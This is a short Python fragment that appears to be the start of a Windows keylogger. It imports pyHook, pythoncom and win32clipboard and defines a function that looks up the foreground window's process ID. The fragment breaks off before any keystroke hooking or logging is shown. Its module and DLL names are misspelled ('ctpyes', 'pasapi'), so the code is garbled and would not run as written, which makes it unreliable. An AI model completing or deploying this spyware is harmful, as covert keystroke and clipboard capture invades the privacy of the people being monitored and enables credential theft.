from ctpyes import *
import pythoncom
import pyHook
import win32clipboard

user32  = windll.user32
kernel32 = windll.kernel32
paspi = windll.pasapi

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)